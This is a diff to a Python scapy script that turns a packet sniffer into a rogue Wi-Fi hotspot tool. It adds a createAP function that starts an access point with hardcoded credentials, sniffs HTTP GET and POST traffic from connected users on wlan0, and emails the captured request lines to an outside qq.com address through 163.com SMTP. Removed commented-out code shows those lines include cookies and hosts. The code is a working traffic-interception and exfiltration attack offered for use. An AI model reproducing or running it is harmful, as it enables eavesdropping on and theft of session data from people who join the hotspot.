@@ -2,7 +2,11 @@
 # coding=utf-8
 # code by 92ez.com
 
+from email.mime.text import MIMEText
 from scapy.all import *
+import subprocess
+import smtplib 
+import time
 import sys
 import os
 
@@ -83,31 +87,34 @@ def dealPackage(packet):
 	
 	if len(lines[-1]) > 1 and len(lines) > 1:
 		print '-'*90
+		# reciver,title,body
+		sendMail('***@qq.com','Notice ! Found Data!','<br>'.join(lines))
 		for line in lines:
 			print line
-	# a_request = []
+			
+def sendMail(receiver, title, body):
+    host = 'smtp.163.com'
+    port = 25
+    sender = '****@163.com'
+    pwd = '****'
 
-	# host = ''
-	# uri = ''
-	# rtype = ''
-	# ua = ''
-	# referer = 'null'
-	# cookie = 'null'
-	# for line in lines:
-	#	 if 'HTTP/1' in line:
-	#		 rtype = line.split()[0].replace("'","")
-	#		 uri = line.split()[1]
-	#	 if 'Host' in line:
-	#		 host = line.split(': ')[1]
-	#	 if 'User-Agent' in line:
-	#		 ua = line.split(': ')[1]
-	#	 if 'Referer' in line:
-	#		 referer = line.split('Referer: ')[1]
-	#	 if 'Cookie' in line:
-	#		 cookie = line.split('Cookie: ')[1]
+    msg = MIMEText(body, 'html')
+    msg['subject'] = title
+    msg['from'] = sender
+    msg['to'] = receiver
+
+    s = smtplib.SMTP(host, port)
+    s.login(sender, pwd)
+    s.sendmail(sender, receiver, msg.as_string())
+
+    print 'The mail named %s to %s is sended successly.' % (title, receiver)
 
 def dosniff():
-	sniff(iface = 'eth0',prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
+	# sniff(iface = 'wlan0',prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
+	sniff(iface = 'wlan0',prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
+
+def createAP():
+	cproc = subprocess.Popen(["create_ap","wlx00e02c313904","wlan0","1205","13509353772","-g","192.168.0.1","--dhcp-dns","8.8.8.8","--no-virt"],stderr=subprocess.PIPE,stdout=subprocess.PIPE)
 
 if __name__ == '__main__':
 	print "================================================="
@@ -117,9 +124,12 @@ if __name__ == '__main__':
 	print "================================================="
 
 	print '\n[*] Checking required...\n'
-
 	checkInstall()
-
 	print '\n[*] Checking required finished !'
-	print '[*] Start sniff !\n'
+
+	print '[*] Create a AP!\n'
+	createAP()
+
+	print '[*] Start sniff!\n'
 	dosniff()
+	
